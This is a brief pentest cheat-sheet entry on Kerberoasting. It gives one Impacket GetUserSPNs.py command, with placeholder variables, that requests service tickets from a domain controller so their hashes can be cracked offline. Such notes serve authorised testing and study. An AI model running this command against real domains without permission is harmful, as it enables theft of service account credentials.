# Kerberos

## Kerberoast - script

```
GetUserSPNs.py -request -dc-ip <domain-controller> <domain>/<user>:<password>
```

= domain-controller: $DC
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
